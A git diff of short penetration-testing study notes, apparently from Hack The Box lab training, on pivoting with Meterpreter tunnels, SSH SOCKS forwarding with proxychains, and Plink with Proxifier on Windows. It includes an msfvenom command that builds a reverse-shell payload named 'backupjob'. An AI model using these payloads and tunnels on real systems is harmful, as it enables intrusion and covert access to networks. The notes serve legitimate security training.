@@ -1,8 +1,6 @@
 
 ---
 ### Meterpreter Tunneling
-
----
 Creating Payload for Ubuntu Pivot Host
 ```bash
 msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=[local_ip] -f elf -o backupjob LPORT=8080
@@ -42,8 +40,6 @@ meterpreter > pwd
 ```
 
 ### SOCKS tunneling
-
----
 #### Dynamic Port Forwarding 
 ```bash
 hcx05@htb[/htb]$ ssh -D 9050 ubuntu@10.129.202.64 -N
@@ -58,22 +54,19 @@ Setting `/etc/proxychains.conf`
 socks5 [ip] [port]
 ```
 
+### Plink(Windows)
+We can use `Plink` to create a ssh tunnel.
+```powershell
+plink.exe -ssh -D 9050 ubuntu@10.129.15.50 -N
+```
+If we're under the cercumstance that don't have interactive mode
+```powershell
+echo y | plink.exe -ssh -D 9050 ubuntu@10.129.15.50 -pw [password] -N
+```
+#### Proxifier
+The Windows equivalent of `proxychains`, it **routes** traffic from apps (like `MSTSC`) into the SOCKS tunnel created by **Plink** (`127.0.0.1:9050`).
 
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
+Plink builds the **Pipe**; Proxifier pushes the **Traffic** into it.
 
 
 
